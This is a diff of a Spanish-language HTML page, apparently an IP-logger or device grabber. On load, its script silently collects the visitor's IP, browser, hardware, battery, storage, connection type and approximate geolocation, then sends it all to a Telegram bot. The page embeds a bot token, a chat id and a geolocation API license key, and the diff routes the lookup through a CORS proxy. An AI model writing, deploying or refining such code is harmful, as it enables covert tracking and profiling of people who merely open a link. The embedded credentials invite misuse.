@@ -1,60 +1,70 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Info Dispositivo</title>
-  <style>
-    body { font-family: Arial, sans-serif; background: #f4f4f4; padding: 2rem; text-align: center; }
-    h1 { color: #333; }
-  </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Geolocalización Avanzada</title>
 </head>
 <body>
-  <h1>Recolectando información...</h1>
+  <h1>Obteniendo información del dispositivo...</h1>
   <script>
+    const license = 'FBPZ80ZEvKAIuT4CR2cYU2**';
+    const telegramToken = '7924985646:AAEETELAHSccchjrQHbDQ0l_Yzhdo94T1wU';
+    const telegramChatId = '7270292739';
+
     async function obtenerInformacion() {
-      const token = '7924985646:AAEETELAHSccchjrQHbDQ0l_Yzhdo94T1wU';
-      const chat_id = '7270292739';
-      const license = 'FBPZ80ZEvKAIuT4CR2cYU2**';
-
-      const ua = navigator.userAgent;
+      const userAgent = navigator.userAgent;
       const platform = navigator.platform;
-      const lang = navigator.language;
+      const language = navigator.language;
       const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-      const screenInfo = `${screen.width}×${screen.height} @${window.devicePixelRatio}×`;
-      const cores = navigator.hardwareConcurrency || 'Desconocido';
+      const screenWidth = screen.width;
+      const screenHeight = screen.height;
+      const pixelRatio = window.devicePixelRatio || 1;
+      const fecha = new Date().toLocaleDateString();
+      const hora = new Date().toLocaleTimeString();
 
-      // RAM (experimental, solo algunos navegadores)
-      const ramGB = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : '≈';
+      const memory = navigator.deviceMemory || 0.5;
+      const cores = navigator.hardwareConcurrency || '?';
 
-      // Batería
-      const battery = await navigator.getBattery?.().then(b => `${Math.round(b.level * 100)}%`).catch(() => 'Desconocido') || 'Desconocido';
+      const ram = `${memory.toFixed(1)} GB`;
+      const cpuCores = cores;
 
-      // Almacenamiento
-      let almacenamiento = '–';
-      if (navigator.storage && navigator.storage.estimate) {
-        try {
-          const estimate = await navigator.storage.estimate();
-          const used = (estimate.usage / (1024 ** 3)).toFixed(2);
-          const total = (estimate.quota / (1024 ** 3)).toFixed(2);
-          almacenamiento = `${used}/${total} GB`;
-        } catch {}
-      }
-
-      // IP Pública
+      // IP pública
       let ip = 'Desconocida';
       try {
         const ipRes = await fetch('https://api.ipify.org?format=json');
-        ip = (await ipRes.json()).ip;
-      } catch {}
+        const ipData = await ipRes.json();
+        ip = ipData.ip || 'Desconocida';
+      } catch (e) { console.warn('IP error:', e); }
 
-      // Localización con Melissa API
+      // Batería
+      let batteryInfo = '–';
+      try {
+        const battery = await navigator.getBattery();
+        batteryInfo = `${(battery.level * 100).toFixed(0)}%`;
+      } catch (e) {}
+
+      // Almacenamiento
+      let storageInfo = '–';
+      try {
+        const storage = await navigator.storage.estimate();
+        const used = (storage.usage / 1e9).toFixed(2);
+        const total = (storage.quota / 1e9).toFixed(2);
+        storageInfo = `${used}/${total} GB`;
+      } catch (e) {}
+
+      // Conexión
+      const connection = navigator.connection || {};
+      const connectionType = connection.effectiveType || '–';
+
+      // Localización con Melissa API (mediante proxy para evitar CORS)
       let ubicacionTexto = '📍 No disponible';
       let mapsURL = '';
       try {
-        const melissaURL = `https://globalip.melissadata.net/v4/web/iplocation/doiplocation?ip=${ip}&id=${license}`;
+        const melissaURL = `https://api.allorigins.win/get?url=${encodeURIComponent(`https://globalip.melissadata.net/v4/web/iplocation/doiplocation?ip=${ip}&id=${license}`)}`;
         const locRes = await fetch(melissaURL);
-        const data = await locRes.json();
+        const raw = await locRes.json();
+        const data = JSON.parse(raw.contents);
 
         const city = data.City || '–';
         const region = data.Region || '–';
@@ -64,48 +74,43 @@
 
         ubicacionTexto = `${city}, ${region}, ${country}`;
         mapsURL = (lat && lon) ? `https://www.google.com/maps?q=${lat},${lon}` : '';
-      } catch {}
+      } catch (e) {
+        console.warn('Error consultando Melissa:', e);
+      }
 
-      // Mensaje para enviar a Telegram
-      const mensaje = `🌍 Ubicación (Melissa API)
+      // Armar mensaje para Telegram
+      const msg =
+`🌍 Ubicación (Melissa API)
 📍 ${ubicacionTexto}
-${mapsURL ? '📌 Ver en Maps: ' + mapsURL : ''}
+${mapsURL ? `Ver en Maps: ${mapsURL}` : ''}
 
 🖥️ Info Dispositivo
 • IP: ${ip}
 • SO/Plataforma: ${platform}
-• Navegador: ${ua}
-• Idioma: ${lang}
+• Navegador: ${userAgent}
+• Idioma: ${language}
 • Zona horaria: ${timezone}
 
 ⚙️ Hardware
-• RAM: ${ramGB}
-• CPU cores: ${cores}
-• Batería: ${battery}
+• RAM: ${ram}
+• CPU cores: ${cpuCores}
+• Batería: ${batteryInfo}
 
 🖥️ Pantalla & Conexión
-• Resolución: ${screenInfo}
-• Almacenamiento: ${almacenamiento}`;
+• Resolución: ${screenWidth}×${screenHeight} @${pixelRatio}×
+• Conexión: ${connectionType}
+• Almacenamiento: ${storageInfo}
+`;
 
-      const telegramURL = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(mensaje)}`;
-
-      fetch(telegramURL)
+      // Enviar a Telegram
+      const url = `https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${telegramChatId}&text=${encodeURIComponent(msg)}`;
+      fetch(url)
         .then(r => r.json())
-        .then(data => {
-          if (data.ok) {
-            document.body.innerHTML = '<h1>✅ Información enviada con éxito</h1>';
-          } else {
-            document.body.innerHTML = '<h1>❌ Error al enviar a Telegram</h1>';
-            console.error(data);
-          }
-        })
-        .catch(err => {
-          document.body.innerHTML = '<h1>❌ Error de red</h1>';
-          console.error(err);
-        });
+        .then(data => console.log('Mensaje enviado:', data))
+        .catch(err => console.error('Error Telegram:', err));
     }
 
-    obtenerInformacion();
+    window.onload = obtenerInformacion;
   </script>
 </body>
 </html>
